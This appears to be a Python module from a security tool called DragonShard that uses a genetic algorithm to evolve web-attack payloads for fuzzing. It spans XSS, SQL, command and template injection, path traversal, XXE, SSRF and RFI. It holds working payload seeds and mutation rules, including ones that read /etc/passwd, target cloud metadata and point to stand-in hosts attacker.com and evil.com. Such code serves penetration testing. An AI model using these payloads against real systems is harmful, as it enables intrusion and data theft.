"""
DragonShard Genetic Algorithm Mutator Module

Uses genetic algorithms with domain-specific language awareness to intelligently mutate payloads.
"""

import random
import re
import json
from typing import List, Dict, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
import logging
from enum import Enum

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Types of payloads for domain-specific awareness."""
    XSS = "xss"
    SQL_INJECTION = "sqli"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LFI = "lfi"
    RFI = "rfi"
    XXE = "xxe"
    SSRF = "ssrf"
    TEMPLATE_INJECTION = "template_injection"
    NOSQL_INJECTION = "no_sql_injection"


@dataclass
class GeneticPayload:
    """Represents a payload in the genetic algorithm."""
    payload: str
    payload_type: PayloadType
    fitness: float = 0.0
    mutation_count: int = 0
    generation: int = 0
    success_rate: float = 0.0
    vulnerability_score: float = 0.0
    
    def __post_init__(self):
        """Initialize the payload with domain-specific parsing."""
        self.tokens = self._tokenize()
        self.syntax_tree = self._parse_syntax()
    
    def _tokenize(self) -> List[str]:
        """Tokenize the payload for analysis."""
        # Split by common delimiters while preserving structure
        tokens = re.split(r'([<>=&\'";\s()\[\]{}])', self.payload)
        return [token for token in tokens if token.strip()]
    
    def _parse_syntax(self) -> Dict[str, Any]:
        """Parse the payload into a syntax tree for domain-specific analysis."""
        tree = {
            "type": self.payload_type.value,
            "tokens": self.tokens,
            "structure": self._analyze_structure(),
            "keywords": self._extract_keywords(),
            "syntax_patterns": self._identify_syntax_patterns()
        }
        return tree
    
    def _analyze_structure(self) -> Dict[str, Any]:
        """Analyze the structural components of the payload."""
        structure = {
            "has_tags": any('<' in token and '>' in token for token in self.tokens) or '<' in self.payload and '>' in self.payload,
            "has_quotes": any('"' in token or "'" in token for token in self.tokens) or '"' in self.payload or "'" in self.payload,
            "has_operators": any(op in self.payload for op in ['OR', 'AND', 'UNION', 'SELECT']),
            "has_functions": any(func in self.payload for func in ['alert', 'eval', 'exec']),
            "has_paths": any('/' in token or '\\' in token for token in self.tokens) or '/' in self.payload or '\\' in self.payload,
            "has_encoding": any('%' in token for token in self.tokens) or '%' in self.payload
        }
        return structure
    
    def _extract_keywords(self) -> List[str]:
        """Extract domain-specific keywords from the payload."""
        keywords = []
        
        if self.payload_type == PayloadType.XSS:
            xss_keywords = ['script', 'alert', 'javascript', 'onload', 'onerror', 'eval']
            keywords = [kw for kw in xss_keywords if kw.lower() in self.payload.lower()]
        
        elif self.payload_type == PayloadType.SQL_INJECTION:
            sql_keywords = ['select', 'union', 'or', 'and', 'drop', 'insert', 'update', 'delete']
            keywords = [kw for kw in sql_keywords if kw.lower() in self.payload.lower()]
        
        elif self.payload_type == PayloadType.COMMAND_INJECTION:
            cmd_keywords = ['ls', 'cat', 'whoami', 'id', 'pwd', 'uname', 'ping']
            keywords = [kw for kw in cmd_keywords if kw.lower() in self.payload.lower()]
        
        return keywords
    
    def _identify_syntax_patterns(self) -> List[str]:
        """Identify syntax patterns in the payload."""
        patterns = []
        
        # HTML/XML patterns
        if re.search(r'<[^>]+>', self.payload):
            patterns.append('html_tag')
        
        # JavaScript patterns
        if re.search(r'javascript:', self.payload, re.IGNORECASE):
            patterns.append('javascript_protocol')
        
        # SQL patterns
        if re.search(r'\b(select|union|or|and)\b', self.payload, re.IGNORECASE):
            patterns.append('sql_keyword')
        
        # Path patterns
        if re.search(r'\.\./', self.payload):
            patterns.append('path_traversal')
        
        # Encoding patterns
        if re.search(r'%[0-9a-fA-F]{2}', self.payload):
            patterns.append('url_encoding')
        
        return patterns


class GeneticMutator:
    """
    Genetic algorithm-based payload mutator with domain-specific language awareness.
    """
    
    def __init__(self, population_size: int = 50, mutation_rate: float = 0.1, 
                 crossover_rate: float = 0.8, max_generations: int = 100):
        """
        Initialize the genetic mutator.
        
        Args:
            population_size: Size of the population
            mutation_rate: Probability of mutation
            crossover_rate: Probability of crossover
            max_generations: Maximum number of generations
        """
        self.population_size = population_size
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.max_generations = max_generations
        self.population: List[GeneticPayload] = []
        self.generation = 0
        self.best_payloads: List[GeneticPayload] = []
        
        # Domain-specific mutation operators
        self.mutation_operators = {
            PayloadType.XSS: self._mutate_xss,
            PayloadType.SQL_INJECTION: self._mutate_sql,
            PayloadType.COMMAND_INJECTION: self._mutate_command,
            PayloadType.PATH_TRAVERSAL: self._mutate_path,
            PayloadType.LFI: self._mutate_lfi,
            PayloadType.RFI: self._mutate_rfi,
            PayloadType.XXE: self._mutate_xxe,
            PayloadType.SSRF: self._mutate_ssrf,
            PayloadType.TEMPLATE_INJECTION: self._mutate_template,
            PayloadType.NOSQL_INJECTION: self._mutate_nosql
        }
        
        # Domain-specific syntax patterns
        self.syntax_patterns = self._load_syntax_patterns()
    
    def _load_syntax_patterns(self) -> Dict[PayloadType, Dict[str, Any]]:
        """Load domain-specific syntax patterns."""
        return {
            PayloadType.XSS: {
                "tags": ["<script>", "<img>", "<svg>", "<iframe>", "<body>"],
                "events": ["onload", "onerror", "onclick", "onfocus", "onchange"],
                "functions": ["alert", "confirm", "prompt", "eval", "fetch"],
                "protocols": ["javascript:", "data:", "vbscript:"]
            },
            PayloadType.SQL_INJECTION: {
                "keywords": ["SELECT", "UNION", "OR", "AND", "DROP", "INSERT"],
                "operators": ["=", "!=", "<>", "LIKE", "IN"],
                "comments": ["--", "#", "/*", "*/"],
                "functions": ["COUNT", "LENGTH", "SUBSTRING", "CONCAT"]
            },
            PayloadType.COMMAND_INJECTION: {
                "separators": [";", "|", "&&", "||", "`", "$()"],
                "commands": ["ls", "cat", "whoami", "id", "pwd", "uname"],
                "operators": ["&", "|", ">", "<", ">>", "<<"]
            },
            PayloadType.PATH_TRAVERSAL: {
                "sequences": ["../", "..\\", "....//", "..%2F"],
                "targets": ["/etc/passwd", "/etc/hosts", "C:\\windows\\system32"],
                "encodings": ["%2F", "%5C", "%c0%af", "%255c"]
            }
        }
    
    def initialize_population(self, base_payloads: List[str], payload_type: PayloadType) -> None:
        """
        Initialize the population with base payloads.
        
        Args:
            base_payloads: List of base payloads to start with
            payload_type: Type of payload for domain-specific awareness
        """
        self.population = []
        
        # Create initial population from base payloads
        for payload in base_payloads:
            genetic_payload = GeneticPayload(payload, payload_type)
            self.population.append(genetic_payload)
        
        # Fill remaining population with random mutations
        while len(self.population) < self.population_size:
            if self.population:
                parent = random.choice(self.population)
                child = self._mutate_payload(parent)
                self.population.append(child)
            else:
                # Create a random payload if no base payloads
                random_payload = self._generate_random_payload(payload_type)
                genetic_payload = GeneticPayload(random_payload, payload_type)
                self.population.append(genetic_payload)
    
    def evolve(self, fitness_function) -> List[GeneticPayload]:
        """
        Evolve the population using genetic algorithms.
        
        Args:
            fitness_function: Function to evaluate payload fitness
            
        Returns:
            List of best payloads from evolution
        """
        logger.info(f"Starting evolution with population size {self.population_size}")
        
        for generation in range(self.max_generations):
            self.generation = generation
            
            # Evaluate fitness
            for payload in self.population:
                payload.fitness = fitness_function(payload)
            
            # Sort by fitness
            self.population.sort(key=lambda x: x.fitness, reverse=True)
            
            # Keep track of best payloads
            best_payloads = self.population[:10]
            self.best_payloads.extend(best_payloads)
            
            # Log progress
            if generation % 10 == 0:
                avg_fitness = sum(p.fitness for p in self.population) / len(self.population)
                logger.info(f"Generation {generation}: Avg fitness = {avg_fitness:.3f}")
            
            # Create new population
            new_population = []
            
            # Elitism: keep best 10% of population
            elite_count = max(1, self.population_size // 10)
            new_population.extend(self.population[:elite_count])
            
            # Generate rest of population through crossover and mutation
            while len(new_population) < self.population_size:
                if random.random() < self.crossover_rate:
                    # Crossover
                    parent1 = self._select_parent()
                    parent2 = self._select_parent()
                    child = self._crossover(parent1, parent2)
                else:
                    # Mutation
                    parent = self._select_parent()
                    child = self._mutate_payload(parent)
                
                new_population.append(child)
            
            self.population = new_population
        
        # Return best payloads
        return sorted(self.best_payloads, key=lambda x: x.fitness, reverse=True)[:20]
    
    def _select_parent(self) -> GeneticPayload:
        """Select a parent using tournament selection."""
        tournament_size = 3
        tournament = random.sample(self.population, tournament_size)
        return max(tournament, key=lambda x: x.fitness)
    
    def _crossover(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """Perform crossover between two parents."""
        # Domain-aware crossover
        if parent1.payload_type != parent2.payload_type:
            # If different types, prefer the better parent
            better_parent = parent1 if parent1.fitness > parent2.fitness else parent2
            return self._mutate_payload(better_parent)
        
        # Same type crossover
        if parent1.payload_type == PayloadType.XSS:
            return self._crossover_xss(parent1, parent2)
        elif parent1.payload_type == PayloadType.SQL_INJECTION:
            return self._crossover_sql(parent1, parent2)
        else:
            return self._crossover_general(parent1, parent2)
    
    def _crossover_xss(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """Crossover for XSS payloads."""
        # Extract components
        p1_tags = [t for t in parent1.tokens if '<' in t and '>' in t]
        p1_events = [t for t in parent1.tokens if 'on' in t.lower()]
        p1_functions = [t for t in parent1.tokens if any(f in t.lower() for f in ['alert', 'eval', 'fetch'])]
        
        p2_tags = [t for t in parent2.tokens if '<' in t and '>' in t]
        p2_events = [t for t in parent2.tokens if 'on' in t.lower()]
        p2_functions = [t for t in parent2.tokens if any(f in t.lower() for f in ['alert', 'eval', 'fetch'])]
        
        # Combine components
        new_tags = p1_tags if random.random() < 0.5 else p2_tags
        new_events = p1_events if random.random() < 0.5 else p2_events
        new_functions = p1_functions if random.random() < 0.5 else p2_functions
        
        # Construct new payload
        if new_tags and new_events:
            new_payload = f"{new_tags[0]} {new_events[0]}={new_functions[0] if new_functions else 'alert(1)'}>"
        elif new_tags:
            new_payload = f"{new_tags[0]} onload=alert(1)>"
        else:
            new_payload = "<script>alert(1)</script>"
        
        # Ensure payload is different from parents
        if new_payload == parent1.payload or new_payload == parent2.payload:
            new_payload = f"{new_payload} crossed"
        
        return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)
    
    def _crossover_sql(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """Crossover for SQL injection payloads."""
        # Extract SQL components
        p1_keywords = [t for t in parent1.tokens if any(kw in t.upper() for kw in ['SELECT', 'UNION', 'OR', 'AND'])]
        p1_operators = [t for t in parent1.tokens if t in ['=', '!=', '<>', 'LIKE']]
        p1_comments = [t for t in parent1.tokens if t in ['--', '#', '/*']]
        
        p2_keywords = [t for t in parent2.tokens if any(kw in t.upper() for kw in ['SELECT', 'UNION', 'OR', 'AND'])]
        p2_operators = [t for t in parent2.tokens if t in ['=', '!=', '<>', 'LIKE']]
        p2_comments = [t for t in parent2.tokens if t in ['--', '#', '/*']]
        
        # Combine components
        new_keywords = p1_keywords if random.random() < 0.5 else p2_keywords
        new_operators = p1_operators if random.random() < 0.5 else p2_operators
        new_comments = p1_comments if random.random() < 0.5 else p2_comments
        
        # Construct new payload
        if new_keywords:
            new_payload = f"'{' '.join(new_keywords)} {new_operators[0] if new_operators else '='} 1"
            if new_comments:
                new_payload += f" {new_comments[0]}"
        else:
            new_payload = "' OR 1=1--"
        
        return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)
    
    def _crossover_general(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
        """General crossover for other payload types."""
        # Simple string crossover
        if len(parent1.payload) > 3 and len(parent2.payload) > 3:
            crossover_point = random.randint(1, min(len(parent1.payload), len(parent2.payload)) - 1)
            new_payload = parent1.payload[:crossover_point] + parent2.payload[crossover_point:]
        else:
            new_payload = parent1.payload if random.random() < 0.5 else parent2.payload
        
        return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)
    
    def _mutate_payload(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate a payload using domain-specific operators."""
        if random.random() > self.mutation_rate:
            return payload
        
        # Use domain-specific mutation
        if payload.payload_type in self.mutation_operators:
            mutated_payload = self.mutation_operators[payload.payload_type](payload)
        else:
            mutated_payload = self._mutate_general(payload)
        
        mutated_payload.mutation_count = payload.mutation_count + 1
        mutated_payload.generation = self.generation
        return mutated_payload
    
    def _mutate_xss(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate XSS payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.XSS]
        
        mutations = [
            # Tag mutations
            lambda p: p.replace("<script>", random.choice(patterns["tags"])),
            lambda p: p.replace("alert", random.choice(patterns["functions"])),
            lambda p: p.replace("onload", random.choice(patterns["events"])),
            # Add encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            lambda p: p.replace("javascript:", "javascript&#58;"),
            # Add quotes
            lambda p: p.replace("alert(1)", 'alert("XSS")'),
            # Add protocol
            lambda p: f"javascript:{p}" if not p.startswith("javascript:") else p
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"
        
        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result
    
    def _mutate_sql(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate SQL injection payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.SQL_INJECTION]
        
        mutations = [
            # Keyword mutations
            lambda p: p.replace("OR", random.choice(patterns["keywords"])),
            lambda p: p.replace("=", random.choice(patterns["operators"])),
            lambda p: p.replace("--", random.choice(patterns["comments"])),
            # Add quotes
            lambda p: f"'{p}" if not p.startswith("'") else p,
            lambda p: f"{p}'" if not p.endswith("'") else p,
            # Add functions
            lambda p: f"UNION SELECT {random.choice(patterns['functions'])}(1)",
            # Add encoding
            lambda p: p.replace("'", "&#39;"),
            # Add spaces
            lambda p: p.replace("OR", " OR ").replace("AND", " AND ")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"
        
        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result
    
    def _mutate_command(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate command injection payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.COMMAND_INJECTION]
        
        mutations = [
            # Separator mutations
            lambda p: p.replace(";", random.choice(patterns["separators"])),
            # Command mutations
            lambda p: p.replace("ls", random.choice(patterns["commands"])),
            # Add operators
            lambda p: f"{p} | grep root",
            lambda p: f"{p} > /tmp/output",
            # Add encoding
            lambda p: p.replace(";", "%3B"),
            # Add quotes
            lambda p: f"`{p}`" if not p.startswith("`") else p
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"
        
        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result
    
    def _mutate_path(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate path traversal payload with domain awareness."""
        patterns = self.syntax_patterns[PayloadType.PATH_TRAVERSAL]
        
        mutations = [
            # Sequence mutations
            lambda p: p.replace("../", random.choice(patterns["sequences"])),
            # Target mutations
            lambda p: p.replace("/etc/passwd", random.choice(patterns["targets"])),
            # Encoding mutations
            lambda p: p.replace("/", "%2F").replace("\\", "%5C"),
            # Add more traversal
            lambda p: f"../../../{p}" if not p.startswith("../") else p,
            # Add null bytes
            lambda p: f"{p}%00",
            # Add double encoding
            lambda p: p.replace("%2F", "%252F")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"
        
        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result
    
    def _mutate_lfi(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate LFI payload with domain awareness."""
        mutations = [
            # Add more traversal
            lambda p: f"../../../{p}" if not p.startswith("../") else p,
            # Add encoding
            lambda p: p.replace("/", "%2F"),
            # Add null bytes
            lambda p: f"{p}%00",
            # Add different targets
            lambda p: p.replace("/etc/passwd", "/etc/hosts"),
            lambda p: p.replace("/etc/passwd", "/proc/version"),
            # Add double encoding
            lambda p: p.replace("%2F", "%252F")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
    
    def _mutate_rfi(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate RFI payload with domain awareness."""
        mutations = [
            # Add different protocols
            lambda p: p.replace("http://", "https://"),
            lambda p: p.replace("http://", "ftp://"),
            # Add encoding
            lambda p: p.replace("://", "%3A//"),
            # Add different file extensions
            lambda p: p.replace(".php", ".jsp"),
            lambda p: p.replace(".php", ".asp"),
            # Add parameters
            lambda p: f"{p}?param=test",
            # Add different domains
            lambda p: p.replace("attacker.com", "evil.com")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
    
    def _mutate_xxe(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate XXE payload with domain awareness."""
        mutations = [
            # Add different entities
            lambda p: p.replace("file:///etc/passwd", "file:///etc/hosts"),
            # Add external entities
            lambda p: p.replace("file:///etc/passwd", "http://attacker.com/evil.dtd"),
            # Add parameter entities
            lambda p: p.replace("<!ENTITY xxe", "<!ENTITY % xxe"),
            # Add different encodings
            lambda p: p.replace("<?xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"),
            # Add different DOCTYPE
            lambda p: p.replace("<!DOCTYPE foo", "<!DOCTYPE data")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
    
    def _mutate_ssrf(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate SSRF payload with domain awareness."""
        mutations = [
            # Add different ports
            lambda p: p.replace("127.0.0.1", "127.0.0.1:8080"),
            # Add different protocols
            lambda p: p.replace("http://", "https://"),
            # Add different IPs
            lambda p: p.replace("127.0.0.1", "0.0.0.0"),
            # Add cloud metadata
            lambda p: p.replace("127.0.0.1", "169.254.169.254/latest/meta-data/"),
            # Add different paths
            lambda p: f"{p}/admin",
            lambda p: f"{p}/api"
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
    
    def _mutate_template(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate template injection payload with domain awareness."""
        mutations = [
            # Add different template syntax
            lambda p: p.replace("{{7*7}}", "${7*7}"),
            lambda p: p.replace("{{7*7}}", "#{7*7}"),
            # Add different expressions
            lambda p: p.replace("7*7", "config"),
            lambda p: p.replace("7*7", "system('id')"),
            # Add different delimiters
            lambda p: p.replace("{{", "<%=").replace("}}", "%>"),
            # Add different functions
            lambda p: p.replace("7*7", "request.environment")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
    
    def _mutate_nosql(self, payload: GeneticPayload) -> GeneticPayload:
        """Mutate NoSQL injection payload with domain awareness."""
        mutations = [
            # Add different operators
            lambda p: p.replace("||", "&&"),
            lambda p: p.replace("||", "|"),
            # Add different values
            lambda p: p.replace("1==1", "true"),
            lambda p: p.replace("1==1", "1"),
            # Add different syntax
            lambda p: p.replace("||", "||"),
            lambda p: p.replace("||", "||"),
            # Add different fields
            lambda p: p.replace("||", "|| this.username=='admin"),
            # Add different quotes
            lambda p: p.replace("'", '"')
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
    
    def _mutate_general(self, payload: GeneticPayload) -> GeneticPayload:
        """General mutation for unknown payload types."""
        mutations = [
            # Character mutations
            lambda p: p.replace("a", "A").replace("e", "E"),
            lambda p: p.replace("1", "2").replace("0", "1"),
            # Add encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            # Add quotes
            lambda p: f'"{p}"' if not p.startswith('"') else p,
            # Add spaces
            lambda p: p.replace("=", " = ").replace("'", " ' "),
            # Reverse case
            lambda p: p.swapcase(),
            # Add random characters
            lambda p: p + random.choice("abcdefghijklmnopqrstuvwxyz")
        ]
        
        mutation = random.choice(mutations)
        new_payload = mutation(payload.payload)
        
        # Ensure payload actually changed
        if new_payload == payload.payload:
            new_payload = f"{new_payload} mutated"
        
        result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
        result.mutation_count = payload.mutation_count + 1
        return result
    
    def _generate_random_payload(self, payload_type: PayloadType) -> str:
        """Generate a random payload for the given type."""
        if payload_type == PayloadType.XSS:
            return "<script>alert(1)</script>"
        elif payload_type == PayloadType.SQL_INJECTION:
            return "' OR 1=1--"
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return "; ls -la"
        elif payload_type == PayloadType.PATH_TRAVERSAL:
            return "../../../etc/passwd"
        else:
            return "test"
    
    def get_best_payloads(self, count: int = 10) -> List[GeneticPayload]:
        """Get the best payloads from evolution."""
        return sorted(self.best_payloads, key=lambda x: x.fitness, reverse=True)[:count]
    
    def export_evolution_data(self, filename: str) -> None:
        """Export evolution data for analysis."""
        data = {
            "generations": self.generation,
            "population_size": self.population_size,
            "mutation_rate": self.mutation_rate,
            "crossover_rate": self.crossover_rate,
            "best_payloads": [
                {
                    "payload": p.payload,
                    "type": p.payload_type.value,
                    "fitness": p.fitness,
                    "generation": p.generation,
                    "mutation_count": p.mutation_count
                }
                for p in self.get_best_payloads(20)
            ]
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Evolution data exported to {filename}")


if __name__ == "__main__":
    # Example usage
    import logging
    logging.basicConfig(level=logging.INFO)
    
    # Initialize genetic mutator
    mutator = GeneticMutator(population_size=30, max_generations=20)
    
    # Base XSS payloads
    base_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]
    
    # Initialize population
    mutator.initialize_population(base_payloads, PayloadType.XSS)
    
    # Define fitness function (example)
    def fitness_function(payload: GeneticPayload) -> float:
        # Simple fitness based on payload characteristics
        score = 0.0
        
        # Reward for having XSS indicators
        if any(indicator in payload.payload.lower() for indicator in ['script', 'alert', 'javascript']):
            score += 0.5
        
        # Reward for encoding
        if any(encoding in payload.payload for encoding in ['&lt;', '&gt;', '%3C', '%3E']):
            score += 0.3
        
        # Reward for event handlers
        if any(event in payload.payload.lower() for event in ['onload', 'onerror', 'onclick']):
            score += 0.4
        
        # Penalty for length (prefer shorter payloads)
        score -= len(payload.payload) * 0.01
        
        return max(0.0, score)
    
    # Evolve population
    best_payloads = mutator.evolve(fitness_function)
    
    print(f"Best payloads after evolution:")
    for i, payload in enumerate(best_payloads[:5]):
        print(f"{i+1}. {payload.payload} (fitness: {payload.fitness:.3f})") 